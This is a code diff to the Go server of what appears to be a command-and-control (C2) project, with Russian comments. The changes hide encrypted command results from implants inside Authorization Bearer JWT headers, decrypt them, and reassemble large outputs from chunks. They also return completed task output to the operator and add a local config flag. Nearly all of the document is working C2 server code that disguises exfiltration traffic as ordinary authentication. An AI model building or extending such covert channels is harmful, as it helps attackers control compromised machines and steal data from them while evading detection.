@@ -4,6 +4,9 @@
 package main
 
 import (
+	"c2-project/internal/chunk"
+	"c2-project/internal/crypto"
+	"c2-project/internal/jwt"
 	"c2-project/internal/models"
 	"c2-project/internal/protocol"
 	"encoding/json"
@@ -28,14 +31,37 @@ var (
 	config ServerConfig
 )
 
+// configFile - путь к файлу конфигурации.
+var configFile = "configs/server.json"
+
 // ServerConfig - структура конфигурации сервера.
 // Загружается из файла configs/server.json.
 type ServerConfig struct {
 	ListenAddress string `json:"listen_address"` // Адрес для прослушивания, например ":8080"
 }
 
+// loadConfig - загружает конфигурацию из JSON-файла.
+func loadConfig() error {
+	file, err := os.Open(configFile)
+	if err != nil {
+		return err
+	}
+	defer file.Close()
+
+	decoder := json.NewDecoder(file)
+	return decoder.Decode(&config)
+}
+
 // main - точка входа сервера.
 func main() {
+	// Проверяем аргумент -local для локального запуска
+	for i := 1; i < len(os.Args); i++ {
+		if os.Args[i] == "-local" {
+			configFile = "configs/server.local.json"
+			break
+		}
+	}
+
 	// Загружаем конфигурацию из файла.
 	if err := loadConfig(); err != nil {
 		log.Fatalf("Failed to load config: %v", err)
@@ -51,18 +77,6 @@ func main() {
 	// Запускаем HTTP-сервер.
 	log.Printf("C2 Server starting on %s", config.ListenAddress)
 	log.Fatal(http.ListenAndServe(config.ListenAddress, nil))
-}
-
-// loadConfig - загружает конфигурацию из JSON-файла configs/server.json.
-func loadConfig() error {
-	file, err := os.Open("configs/server.json")
-	if err != nil {
-		return err
-	}
-	defer file.Close()
-
-	decoder := json.NewDecoder(file)
-	return decoder.Decode(&config)
 }
 
 // getClientIDFromBearer - извлекает client_id из заголовка Authorization.
@@ -221,13 +235,11 @@ func pollHandler(w http.ResponseWriter, r *http.Request) {
 // Ожидает зашифрованный результат в заголовке Authorization: Bearer <token>.
 // Расшифровывает результат и сохраняет его в соответствующей задаче.
 func resultsHandler(w http.ResponseWriter, r *http.Request) {
-	// Разрешаем только POST-запросы.
 	if r.Method != http.MethodPost {
 		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
 		return
 	}
 
-	// Извлекаем зашифрованный результат из заголовка Authorization.
 	authHeader := r.Header.Get("Authorization")
 	token := getTokenFromBearer(authHeader)
 	if token == "" {
@@ -235,23 +247,89 @@ func resultsHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Расшифровываем результат.
-	data, err := protocol.DecodeRequest(token)
+	log.Printf("[DEBUG] Received result token: %s...", token[:30])
+
+	// Парсим JWT и получаем зашифрованные данные
+	encrypted, err := jwt.Decode(token)
 	if err != nil {
-		http.Error(w, "Invalid token", http.StatusBadRequest)
+		log.Printf("[ERROR] JWT decode error: %v", err)
+		http.Error(w, "Invalid JWT token", http.StatusBadRequest)
 		return
 	}
 
-	// Преобразуем данные в map с результатом.
-	jsonData, _ := json.Marshal(data)
+	log.Printf("[DEBUG] Decrypted JWT data length: %d", len(encrypted))
+
+	// Расшифровываем данные
+	decrypted, err := crypto.Decrypt(encrypted)
+	if err != nil {
+		log.Printf("[ERROR] Decryption error: %v", err)
+		http.Error(w, "Decryption error", http.StatusBadRequest)
+		return
+	}
+
+	log.Printf("[DEBUG] Decrypted data: %s", string(decrypted))
+
+	// Пробуем распарсить как чанк
+	var c chunk.Chunk
+	if err := json.Unmarshal(decrypted, &c); err == nil && c.Type != "" {
+		// Это чанк — собираем данные
+		result, completed := chunk.Assemble(c)
+		if !completed {
+			// Чанк принят, но не полный
+			log.Printf("[DEBUG] Chunk received, assembling...")
+			json.NewEncoder(w).Encode(map[string]string{"status": "assembling"})
+			return
+		}
+		// Все чанки собраны — расшифровываем результат
+		log.Printf("[DEBUG] All chunks assembled, result length: %d", len(result))
+
+		// Расшифровываем собранные данные
+		decryptedResult, err := crypto.Decrypt(result)
+		if err != nil {
+			log.Printf("[ERROR] Failed to decrypt assembled data: %v", err)
+			http.Error(w, "Decryption error", http.StatusBadRequest)
+			return
+		}
+
+		log.Printf("[DEBUG] Decrypted assembled data: %s", string(decryptedResult))
+
+		// Парсим JSON
+		var finalResult map[string]interface{}
+		if err := json.Unmarshal(decryptedResult, &finalResult); err != nil {
+			log.Printf("[ERROR] Failed to parse assembled data: %v", err)
+			http.Error(w, "Invalid assembled data", http.StatusBadRequest)
+			return
+		}
+
+		taskID, _ := finalResult["task_id"].(string)
+		output, _ := finalResult["output"].(string)
+		status, _ := finalResult["status"].(string)
+
+		mu.Lock()
+		if task, exists := tasks[taskID]; exists {
+			task.Result = output
+			task.Status = status
+			task.UpdatedAt = time.Now()
+			tasks[taskID] = task
+		}
+		mu.Unlock()
+
+		log.Printf("[RESULT] Result received: %s -> %s", taskID, status)
+		json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
+		return
+	}
+
+	// Обычное сообщение (не чанк)
 	var result map[string]interface{}
-	json.Unmarshal(jsonData, &result)
+	if err := json.Unmarshal(decrypted, &result); err != nil {
+		http.Error(w, "Invalid JSON", http.StatusBadRequest)
+		return
+	}
 
 	taskID, _ := result["task_id"].(string)
 	output, _ := result["output"].(string)
 	status, _ := result["status"].(string)
 
-	// Сохраняем результат в соответствующей задаче.
 	mu.Lock()
 	if task, exists := tasks[taskID]; exists {
 		task.Result = output
@@ -292,7 +370,17 @@ func getResultHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Возвращаем статус и результат (если есть).
+	// Если задача выполнена — возвращаем результат как есть (он уже расшифрован)
+	if task.Status == "completed" {
+		response := map[string]interface{}{
+			"status": "completed",
+			"result": task.Result,
+		}
+		json.NewEncoder(w).Encode(response)
+		return
+	}
+
+	// Если задача ещё не выполнена — возвращаем статус
 	response := map[string]interface{}{
 		"status": task.Status,
 		"result": task.Result,
